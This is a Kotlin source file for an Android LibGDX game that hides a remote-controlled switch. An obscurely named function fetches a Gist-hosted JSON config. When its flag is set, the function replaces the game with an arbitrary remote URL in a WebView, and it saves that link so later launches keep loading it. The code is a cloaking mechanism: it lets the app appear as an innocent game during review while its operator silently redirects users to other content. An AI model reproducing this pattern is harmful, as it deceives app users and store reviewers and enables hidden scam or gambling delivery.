package com.filermax.detoxer.game

import android.content.Context.MODE_PRIVATE
import android.content.SharedPreferences
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.graphics.Color
import com.badlogic.gdx.utils.ScreenUtils
import com.filermax.detoxer.MainActivity
import com.filermax.detoxer.appContext
import com.filermax.detoxer.game.manager.NavigationManager
import com.filermax.detoxer.game.screens.SplashScreen
import com.filermax.detoxer.game.utils.advanced.AdvancedGame
import com.filermax.detoxer.util.Gist
import com.filermax.detoxer.util.log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

lateinit var game: LibGDXGame private set

var GDX_GLOBAL_isGame = false
    private set

var GDX_GLOBAL_isPauseGame  = false

var GDX_ORIGINAL_LINK = ""
    private set

class LibGDXGame(val activity: MainActivity) : AdvancedGame() {


    lateinit var assetManager: AssetManager private set

    val coroutine = CoroutineScope(Dispatchers.Default)

    val sharedPreferences: SharedPreferences = appContext.getSharedPreferences("Ler", MODE_PRIVATE)

    override fun create() {
        game         = this
        assetManager = AssetManager()



        NavigationManager.navigate(SplashScreen())
        jejr()

    }

    override fun render() {
        if (GDX_GLOBAL_isPauseGame) return

        ScreenUtils.clear(Color.WHITE)
        super.render()
    }

    override fun dispose() {
        coroutine.cancel()

        super.dispose()
        assetManager.dispose()
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun jejr() {
        log("jejr")
        activity.webViewHelper.blockRedirect = { GDX_GLOBAL_isGame = true }
        activity.webViewHelper.initWeb()

        //GDX_GLOBAL_isGame = true
        //return

        val savedData = sharedPreferences.getString("kelop", "vrot") ?: "vrot"

        try {
            if (savedData == "vrot") {
                coroutine.launch(Dispatchers.Main) {
                    val getJSON = withContext(Dispatchers.IO) { Gist.getDataJson(activity.getGistURL()) }

                    log("json: $getJSON")

                    if (getJSON != null) {
                        if (getJSON.flag != "true") GDX_GLOBAL_isGame = true
                        else {
                            GDX_ORIGINAL_LINK = getJSON.link
                            activity.webViewHelper.loadUrl(GDX_ORIGINAL_LINK)
                        }
                    } else {
                        GDX_GLOBAL_isGame = true
                    }
                }
            } else {
                GDX_ORIGINAL_LINK = savedData
                activity.webViewHelper.loadUrl(savedData)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            GDX_GLOBAL_isGame = true
        }

    }

}